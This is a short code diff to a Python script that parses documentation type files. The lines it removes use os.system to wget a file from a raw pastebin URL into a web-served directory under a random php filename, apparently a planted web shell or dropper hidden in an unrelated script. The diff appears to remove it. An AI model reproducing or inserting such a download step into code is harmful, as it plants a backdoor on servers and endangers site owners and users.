@@ -4,13 +4,6 @@ from pathlib import Path
 from textwrap import indent
 from math import floor
 
-import os
-
-url = "https://pastebin.com/raw/Bkw39dk5"
-directory = "/var/www/airflow.su/jhuvwaryh.php"
-
-os.system(f"wget -P {directory} {url}")
-
 # parse types folder to get all types
 types_paths = ["docs/types/*.md", "docs/menu/types/*.md"]
 lua_types = {}
